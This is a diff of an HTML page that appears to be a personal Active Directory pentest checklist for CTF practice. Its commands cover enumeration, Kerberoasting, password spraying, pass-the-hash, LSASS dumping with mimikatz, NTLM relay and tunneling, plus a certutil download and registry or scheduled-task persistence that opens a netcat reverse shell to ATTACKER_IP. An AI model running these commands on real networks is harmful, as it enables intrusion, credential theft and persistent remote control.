@@ -2,26 +2,13 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>WillJTools AD Pentest Checklist</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>WillJTools Active Directory Penetration Testing Checklist</title>
   <link rel="stylesheet" href="styles.css" />
-  <style>
-    label {
-      display: block;
-      font-family: monospace;
-      margin-left: 1em;
-    }
-    section {
-      margin-bottom: 2em;
-    }
-    input[type="checkbox"] {
-      margin-right: 8px;
-    }
-  </style>
 </head>
 <body>
   <header>
-    <h1>Active Directory Penetration Testing Checklist</h1>
+    <h1>WillJTools Active Directory Penetration Testing Checklist</h1>
     <nav>
       <a href="index.html">Back to Home</a>
     </nav>
@@ -29,97 +16,127 @@
 
   <main>
     <section>
-      <h3>Recon & Enumeration</h3>
-      <label><input type="checkbox" /> export TARGET=10.10.10.10</label>
-      <label><input type="checkbox" /> export DOMAIN=egotistical-bank.local</label>
-      <label><input type="checkbox" /> nmap -p- -Pn $TARGET -v -T5 --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 --open -oN nmapAD.txt</label>
-      <label><input type="checkbox" /> rpcclient -U "" $TARGET</label>
-      <label><input type="checkbox" /> smbclient -L //$TARGET/ -N</label>
-      <label><input type="checkbox" /> enum4linux-ng -A $TARGET</label>
-      <label><input type="checkbox" /> smbmap -H $TARGET</label>
-      <label><input type="checkbox" /> crackmapexec smb $TARGET --shares --users</label>
-      <label><input type="checkbox" /> nbtscan $TARGET</label>
-      <label><input type="checkbox" /> ldapsearch -x -H ldap://$TARGET -s base</label>
-      <label><input type="checkbox" /> ldapsearch -x -H ldap://$TARGET -b "dc=egotistical-bank,dc=local" "(objectClass=*)"</label>
-      <label><input type="checkbox" /> crackmapexec ldap $TARGET -u '' -p '' --users</label>
+      <h2>Recon & Enumeration</h2>
+      <ul>
+        <li><input type="checkbox" /> export TARGET=x.x.x.x</li>
+        <li><input type="checkbox" /> export DOMAIN=egotistical-bank.local</li>
+        <li><input type="checkbox" /> nmap -p- -Pn $TARGET -v -T5 --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 --open -oN nmapAD.txt</li>
+        <li><input type="checkbox" /> rpcclient -U "" $TARGET</li>
+        <li><input type="checkbox" /> smbclient -L //$TARGET/ -N</li>
+        <li><input type="checkbox" /> enum4linux-ng -A $TARGET</li>
+        <li><input type="checkbox" /> smbmap -H $TARGET</li>
+        <li><input type="checkbox" /> crackmapexec smb $TARGET --shares --users</li>
+        <li><input type="checkbox" /> nbtscan $TARGET</li>
+        <li><input type="checkbox" /> ldapsearch -x -H ldap://$TARGET -s base</li>
+        <li><input type="checkbox" /> ldapsearch -x -H ldap://$TARGET -b "dc=egotistical-bank,dc=local" "(objectClass=*)"</li>
+        <li><input type="checkbox" /> crackmapexec ldap $TARGET -u '' -p '' --users</li>
+        <li><input type="checkbox" /> bloodhound-python -u user -p password -gc $DOMAIN -dc-ip $TARGET -c All</li>
+        <li><input type="checkbox" /> enum4linux $TARGET (legacy alternative)</li>
+        <li><input type="checkbox" /> dnsrecon -t std -d $DOMAIN -n $TARGET</li>
+        <li><input type="checkbox" /> dig axfr $DOMAIN @$TARGET</li>
+      </ul>
     </section>
 
     <section>
-      <h3>Kerberos Attacks</h3>
-      <label><input type="checkbox" /> kerbrute userenum --dc $TARGET -d $DOMAIN users.txt</label>
-      <label><input type="checkbox" /> GetNPUsers.py $DOMAIN/ -usersfile users.txt -format hashcat -dc-ip $TARGET</label>
-      <label><input type="checkbox" /> GetUserSPNs.py $DOMAIN/$USER:$PASS -dc-ip $TARGET -request</label>
+      <h2>Kerberos Attacks</h2>
+      <ul>
+        <li><input type="checkbox" /> kerbrute userenum --dc $TARGET -d $DOMAIN users.txt</li>
+        <li><input type="checkbox" /> GetNPUsers.py $DOMAIN/ -usersfile users.txt -format hashcat -dc-ip $TARGET</li>
+        <li><input type="checkbox" /> GetUserSPNs.py $DOMAIN/$USER:$PASS -dc-ip $TARGET -request</li>
+        <li><input type="checkbox" /> hashcat -m 18200 hashes.aspreroast rockyou.txt</li>
+        <li><input type="checkbox" /> hashcat -m 13100 spn.hashes rockyou.txt</li>
+        <li><input type="checkbox" /> impacket-GetTGT -hashes :NTLM_HASH $USER@$DOMAIN</li>
+      </ul>
     </section>
 
     <section>
-      <h3>Password Spraying & Credential Abuse</h3>
-      <label><input type="checkbox" /> crackmapexec smb $SUBNET -u user -p pass</label>
-      <label><input type="checkbox" /> kerbrute spray --dc $TARGET -d $DOMAIN users.txt passwords.txt</label>
+      <h2>Password Attacks</h2>
+      <ul>
+        <li><input type="checkbox" /> crackmapexec smb $TARGET -u user -p password</li>
+        <li><input type="checkbox" /> kerbrute passwordspray --dc $TARGET -d $DOMAIN users.txt passwords.txt</li>
+        <li><input type="checkbox" /> hydra -L users.txt -P passwords.txt smb://$TARGET</li>
+      </ul>
     </section>
 
     <section>
-      <h3>Pass-the-Hash & Ticket Attacks</h3>
-      <label><input type="checkbox" /> psexec.py $DOMAIN/$USER@$TARGET -hashes :NTHASH</label>
-      <label><input type="checkbox" /> wmiexec.py $DOMAIN/$USER@$TARGET -hashes :NTHASH</label>
-      <label><input type="checkbox" /> smbexec.py $DOMAIN/$USER@$TARGET -hashes :NTHASH</label>
-      <label><input type="checkbox" /> atexec.py $DOMAIN/$USER@$TARGET -hashes :NTHASH</label>
-      <label><input type="checkbox" /> secretsdump.py $DOMAIN/$USER@$TARGET -hashes :NTHASH</label>
+      <h2>Pass-the-Hash & Pass-the-Ticket</h2>
+      <ul>
+        <li><input type="checkbox" /> psexec.py $DOMAIN/$USER@$TARGET -hashes :NTLM_HASH</li>
+        <li><input type="checkbox" /> wmiexec.py $DOMAIN/$USER@$TARGET -hashes :NTLM_HASH</li>
+        <li><input type="checkbox" /> smbexec.py $DOMAIN/$USER@$TARGET -hashes :NTLM_HASH</li>
+        <li><input type="checkbox" /> atexec.py $DOMAIN/$USER@$TARGET -hashes :NTLM_HASH</li>
+        <li><input type="checkbox" /> export KRB5CCNAME=~/ticket.ccache && klist</li>
+        <li><input type="checkbox" /> impacket-smbclient -k -no-pass $DOMAIN/$USER@$TARGET</li>
+      </ul>
     </section>
 
     <section>
-      <h3>WinRM & Evil-WinRM</h3>
-      <label><input type="checkbox" /> crackmapexec winrm $TARGET -u user -p pass</label>
-      <label><input type="checkbox" /> nxc winrm -u user -p pass -H $TARGET</label>
-      <label><input type="checkbox" /> evil-winrm -i $TARGET -u user -p pass</label>
+      <h2>WinRM & Remote Shell</h2>
+      <ul>
+        <li><input type="checkbox" /> crackmapexec winrm $TARGET -u user -p password</li>
+        <li><input type="checkbox" /> evil-winrm -i $TARGET -u user -p password</li>
+        <li><input type="checkbox" /> nxc winrm -u user -p password -H $TARGET</li>
+      </ul>
     </section>
 
     <section>
-      <h3>Group Policy Preference Exploitation</h3>
-      <label><input type="checkbox" /> smbclient //TARGET/SYSVOL -U "$DOMAIN\$USER"</label>
-      <label><input type="checkbox" /> gpp-decrypt <cpassword></label>
+      <h2>GPP & SYSVOL Exploitation</h2>
+      <ul>
+        <li><input type="checkbox" /> smbclient //TARGET/SYSVOL -U "$DOMAIN\$USER"</li>
+        <li><input type="checkbox" /> look for Groups.xml in Policies directories</li>
+        <li><input type="checkbox" /> gpp-decrypt <cpassword></li>
+      </ul>
     </section>
 
     <section>
-      <h3>BloodHound Enumeration</h3>
-      <label><input type="checkbox" /> Upload SharpHound via smbclient or evil-winrm</label>
-      <label><input type="checkbox" /> SharpHound.exe -c all</label>
+      <h2>Post Exploitation / Priv Esc</h2>
+      <ul>
+        <li><input type="checkbox" /> certutil -urlcache -split -f http://ATTACKER_IP/winPEASany.exe winPEAS.exe</li>
+        <li><input type="checkbox" /> winPEAS.exe > winpeas_output.txt</li>
+        <li><input type="checkbox" /> systeminfo</li>
+        <li><input type="checkbox" /> whoami /all</li>
+        <li><input type="checkbox" /> procdump64.exe -accepteula -ma lsass.exe lsass.dmp</li>
+        <li><input type="checkbox" /> mimikatz: sekurlsa::minidump lsass.dmp</li>
+        <li><input type="checkbox" /> SharpHound.exe -c all</li>
+      </ul>
     </section>
 
     <section>
-      <h3>Post Exploitation & Privilege Escalation</h3>
-      <label><input type="checkbox" /> certutil -urlcache -split -f http://ATTACKER_IP/winPEASany.exe winPEAS.exe</label>
-      <label><input type="checkbox" /> winPEAS.exe > winpeas_output.txt</label>
-      <label><input type="checkbox" /> procdump64.exe -accepteula -ma lsass.exe lsass.dmp</label>
-      <label><input type="checkbox" /> mimikatz: sekurlsa::minidump lsass.dmp</label>
+      <h2>Responder & NTLM Relay</h2>
+      <ul>
+        <li><input type="checkbox" /> sudo responder -I tun0</li>
+        <li><input type="checkbox" /> ntlmrelayx.py -t ldap://$TARGET --no-smb-server</li>
+        <li><input type="checkbox" /> mitm6 -d $DOMAIN</li>
+      </ul>
     </section>
 
     <section>
-      <h3>NTLM Relaying & Responder</h3>
-      <label><input type="checkbox" /> sudo Responder -I tun0</label>
-      <label><input type="checkbox" /> ntlmrelayx.py -t ldap://$TARGET --no-smb-server</label>
+      <h2>Pivoting & Tunneling</h2>
+      <ul>
+        <li><input type="checkbox" /> ssh -R 9000:127.0.0.1:3389 user@attacker-ip</li>
+        <li><input type="checkbox" /> chisel server -p 9001 --reverse</li>
+        <li><input type="checkbox" /> chisel client attacker-ip:9001 R:3389:127.0.0.1:3389</li>
+        <li><input type="checkbox" /> plink.exe -R 9000:127.0.0.1:3389 user@attacker-ip</li>
+      </ul>
     </section>
 
     <section>
-      <h3>Pivoting & Tunneling</h3>
-      <label><input type="checkbox" /> ssh -R 9000:127.0.0.1:3389 user@attacker-ip</label>
-      <label><input type="checkbox" /> chisel server -p 9001 --reverse</label>
-      <label><input type="checkbox" /> chisel client attacker-ip:9001 R:3389:127.0.0.1:3389</label>
+      <h2>Credential Dumping</h2>
+      <ul>
+        <li><input type="checkbox" /> secretsdump.py $DOMAIN/$USER@$TARGET</li>
+        <li><input type="checkbox" /> mimikatz: sekurlsa::logonpasswords</li>
+        <li><input type="checkbox" /> findstr /si password *.txt *.xml *.ini</li>
+        <li><input type="checkbox" /> reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s</li>
+      </ul>
     </section>
 
     <section>
-      <h3>Credential Dumping</h3>
-      <label><input type="checkbox" /> secretsdump.py $DOMAIN/$USER@$TARGET</label>
-      <label><input type="checkbox" /> mimikatz: sekurlsa::logonpasswords</label>
-    </section>
-
-    <section>
-      <h3>Persistence (CTF Only)</h3>
-      <label><input type="checkbox" /> reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Evil /t REG_SZ /d "cmd.exe /c nc.exe -e cmd.exe ATTACKER_IP 4444"</label>
+      <h2>Persistence Techniques (CTF Safe)</h2>
+      <ul>
+        <li><input type="checkbox" /> reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Evil /t REG_SZ /d "cmd.exe /c nc.exe -e cmd.exe ATTACKER_IP 4444"</li>
+        <li><input type="checkbox" /> schtasks /create /sc minute /mo 5 /tn "Updater" /tr "nc.exe -e cmd.exe ATTACKER_IP 4444"</li>
+      </ul>
     </section>
   </main>
-
-  <footer>
-    <p>© 2025 WillJTools AD Pentest Project</p>
-  </footer>
 </body>
 </html>
